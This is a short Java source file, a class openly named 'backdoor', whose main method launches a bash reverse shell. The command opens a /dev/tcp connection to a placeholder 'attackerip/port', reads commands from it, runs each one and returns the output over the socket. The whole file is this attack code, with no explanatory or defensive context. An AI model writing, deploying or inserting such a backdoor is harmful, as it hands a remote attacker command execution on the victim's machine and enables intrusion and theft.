import java.io.*;
class backdoor {
        public static void main(String args[]) {

			Process p = null;
		  	try {		
			    p = Runtime.getRuntime().exec(new String[] { 
			    "/bin/bash","-c","exec 5<>/dev/tcp/attackerip/port; cat<&5 | while read line;do $line 2>&5>&5;done"
			    });
			    if (p != null) {
			    p.waitFor();
			    }
			} catch (Exception e) {return;}
	}
}
